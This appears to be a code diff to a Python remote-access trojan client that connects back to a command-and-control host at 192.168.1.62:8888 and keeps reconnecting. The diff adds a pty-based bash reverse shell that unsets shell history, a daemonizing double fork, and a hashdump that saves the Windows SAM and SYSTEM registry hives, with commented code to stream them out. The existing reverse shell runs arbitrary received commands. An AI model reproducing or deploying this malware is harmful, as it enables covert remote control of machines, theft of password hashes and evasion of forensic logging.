@@ -2,11 +2,16 @@ import socket, ssl, threading, sys, os, subprocess
 import secrets, platform, uuid, datetime
 import shutil, hashlib, mss, mss.tools
 from getpass import getuser
+from time import sleep
+
 if platform.system() == "Windows":
     import winreg
 
 ERROR_INSUFFICIENT_PERMS = b'\x98\x90\x90\x30\x22\x11'
-SIG_EOF = b'\x4F\x4F\x4E\x4F\x01' 
+SIG_EOF = b'\x4F\x4F\x4E\x4F\x01'
+
+SHELL = ["/bin/bash", "--noprofile"]
+FIRST_COMMAND = "unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND"
 
 class Client:
     def __init__(self, server_address, server_port):
@@ -76,7 +81,61 @@ class Client:
 
     def screenshot(self, args):
         raise NotImplementedError("This method should be implemented by subclasses")
+    """
+    def daemonize(self, args):
+        def fork():
+            try:
+                pid = os.fork()
+                if pid > 0:
+                    # Exit parent
+                    sys.exit(0)
+            except OSError as e:
+                print("Error while forking: ", e)
+                sys.exit(1)
 
+        # Double fork to daemonize
+        fork()
+        os.setsid()
+        os.umask(0)
+        fork()
+
+    def reverse_shell(self, args):
+        s = self.secure_sock
+        master, slave = pty.openpty()
+        bash = subprocess.Popen(SHELL,
+                                preexec_fn=os.setsid,
+                                stdin=slave,
+                                stdout=slave,
+                                stderr=slave,
+                                universal_newlines=True)
+        sleep(1)  # Wait for bash to start before sending data to it.
+        os.write(master, bytes("{}\n".format(FIRST_COMMAND), encoding="utf-8"))
+
+        try:
+            while bash.poll() is None:
+                r, w, e = select.select([s, master], [], [])
+
+                # SSLSockets don't play nice with select because they buffer data internally.
+                # Code taken from https://stackoverflow.com/questions/3187565/select-and-ssl-in-python.
+                if s in r:
+                    try:
+                        data = s.recv(1024)
+                    except ssl.SSLError as e:
+                        if e.errno == ssl.SSL_ERROR_WANT_READ:
+                            continue
+                        raise
+                    if not data:  # End of file.
+                        break
+                    data_left = s.pending()
+                    while data_left:
+                        data += s.recv(data_left)
+                        data_left = s.pending()
+                    os.write(master, data)
+                elif master in r:
+                    s.write(os.read(master, 2048))
+        finally:
+            s.close()
+    """
     def reverse_shell(self, args):
         while True:
             command = self.secure_sock.recv(4096).decode()
@@ -89,6 +148,8 @@ class Client:
                     output = f"Changed directory to {os.getcwd()}"
                 else:
                     output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                    ####
+
             except subprocess.CalledProcessError as e:
                 output = e.output
                 self.secure_sock.send(output.encode())
@@ -194,7 +255,26 @@ class WindowsClient(Client):
         winreg.CloseKey(key)
 
     def hashdump(self, args):
+        base_path = os.path.join('C:', 'Windows', 'Temp')
+        sam_path = os.path.join(base_path, 'sam')
+        system_path = os.path.join(base_path, 'system')
+
+        subprocess.run("reg save HKLM\\SAM %s" % sam_path, shell=True)
+        subprocess.run("reg save HKLM\\SYSTEM %s" % system_path, shell=True)
+        """
+        if os.access(sam_path, os.R_OK):
+            try:
+                with open(sam_path,'rb') as f:
+                    while (chunk := f.read(4096)):
+                        self.secure_sock.sendall(chunk)
+                self.secure_sock.sendall(SIG_EOF)
+            except Exception as e:
+                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
+        else:
+            # Sending error code if user doesnt have permissions to dump hashes
+            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
         self.secure_sock.sendall(SIG_EOF)
+        """
 
     def ipconfig(self, args):
         output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
@@ -265,13 +345,17 @@ class LinuxClient(Client):
             self.secure_sock.sendall(output.encode())
 
 if __name__ == "__main__":
-    C2_IP = '127.0.0.1'
+    C2_IP = '192.168.1.62'
     C2_PORT = 8888
     if platform.system() == 'Windows':
         client = WindowsClient(C2_IP, C2_PORT)
         # client.persistence()
     else:
         client = LinuxClient(C2_IP, C2_PORT)
-        client.persistence()
-
-    client.connect()
+        #client.persistence()
+    while True:
+        try:
+            client.connect()
+        except:
+            sleep(3)
+            continue
